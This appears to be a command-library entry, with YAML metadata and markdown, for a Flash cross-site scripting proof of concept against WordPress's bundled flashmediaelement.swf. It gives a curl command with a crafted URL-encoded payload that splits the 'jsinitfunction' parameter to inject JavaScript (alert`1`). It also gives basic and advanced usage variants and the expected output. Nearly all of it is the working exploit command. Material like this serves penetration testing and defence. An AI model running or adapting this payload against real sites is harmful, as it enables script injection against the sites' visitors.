---
id: cmd-uuid-1
data: >-
  curl
  "https://target.com/wp-includes/js/mediaelement/flashmediaelement.swf?%25#jsinitfunctio%25gn=alert%601%60"
  -v
tags:
  - xss
  - poc
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.617Z'
verified: false
validated: true
submitted: true
---
# curl-flash-xss-poc

## Command

```bash
curl "https://target.com/wp-includes/js/mediaelement/flashmediaelement.swf?%25#jsinitfunctio%25gn=alert%601%60" -v
```

## Description

Sends a GET request to the vulnerable SWF endpoint with the crafted, URL-encoded payload to trigger the Flash XSS. Use -v for verbose output to inspect headers and response. For execution visualization, open in browser instead.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target SWF with encoded params | Yes |
| -v | Verbose mode for debugging | No |

## Examples

### Basic Usage

```bash
curl "https://example.com/wp-includes/js/mediaelement/flashmediaelement.swf?%25#jsinitfunctio%25gn=alert%601%60" -v
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" "https://target.com/wp-includes/js/mediaelement/flashmediaelement.swf?%25#jsinitfunctio%25gn=alert%601%60" -v -o response.swf
```

## Expected Output

HTTP/1.1 200 OK response with SWF binary content. In browser context, triggers JS execution (e.g., alert). Verbose shows connection details; no direct JS output in curl.

## Related

- [[commands/block-swf-direct-access]]
- [[procedures/Execute-Flash-XSS-PoC-in-WordPress]]
